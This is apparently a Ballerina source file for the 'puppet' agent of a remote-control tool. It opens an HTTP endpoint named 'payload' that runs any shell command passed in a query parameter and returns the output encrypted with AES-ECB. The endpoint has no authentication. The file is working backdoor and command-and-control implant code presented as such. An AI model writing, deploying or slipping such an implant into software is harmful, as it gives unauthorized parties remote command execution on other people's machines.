// Filename: puppet/main.bal
// Author: Nathanne Isip
// License: Mozilla Public License 2.0 (MPL-2.0)

import ballerina/http;

import rheolaeth.crypt;
import rheolaeth.response;
import rheolaeth.shell;

configurable int port = ?;
configurable string key = ?;

service / on new http:Listener(port) {
    resource function get payload(http:Request request, string script) returns json {
        request.setHeader("Content-Type", "application/json");

        string|error shellResult = shell:shellExecute(script);
        if shellResult is error {
            return response:errorResponse(shellResult.message());
        }

        string|error encryptedResult = crypt:aesEcbEncrypt(key, shellResult);
        if encryptedResult is error {
            return response:errorResponse(encryptedResult.message());
        }

        return response:successResponse(encryptedResult);
    }
}
